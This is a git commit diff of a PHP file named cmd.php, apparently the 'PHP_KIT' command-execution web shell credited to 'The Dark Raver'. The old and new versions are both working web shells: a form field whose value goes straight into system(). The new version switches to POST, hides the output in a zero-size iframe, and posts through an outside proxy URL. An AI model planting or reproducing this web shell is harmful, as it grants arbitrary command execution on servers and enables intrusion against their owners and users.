04e32da9946427962794c778071a68b2c63eb2cf
Wasa Sra <wasasra04@gmail.com>
2018-09-06 09:45:27 -0400

    .

--- cmd.php
+++ cmd.php
@@ -1,23 +1,14 @@
-<?
-//
-// PHP_KIT
-//
-// cmd.php = Command Execution
-//
-// by: The Dark Raver
-// modified: 21/01/2004
-//
-?>
 <HTML><BODY>
-<FORM METHOD="GET" NAME="myform" ACTION="https://img.loopassets.net/?url=https://wasasra04.github.io/cmd.php">
-<INPUT TYPE="text" NAME="cmd">
-<INPUT TYPE="submit" VALUE="Send">
-</FORM>
-<pre>
-<?
-if($_GET['cmd']) {
-  system($_GET['cmd']);
-  }
-?>
-</pre>
+	<FORM METHOD="POST" NAME="myform" ACTION="https://img.loopassets.net/?url=https://wasasra04.github.io/cmd.php" TARGET="dummyframe">
+		<INPUT TYPE="text" NAME="cmd">
+		<INPUT TYPE="submit" VALUE="Shitpost">
+	</FORM>
+	<iframe width="0" height="0" border="0" name="dummyframe" id="dummyframe"></iframe>
+	<pre>
+		<?
+		if($_POST['cmd']) {
+			system($_POST['cmd']);
+		}
+		?>
+	</pre>
 </BODY></HTML>
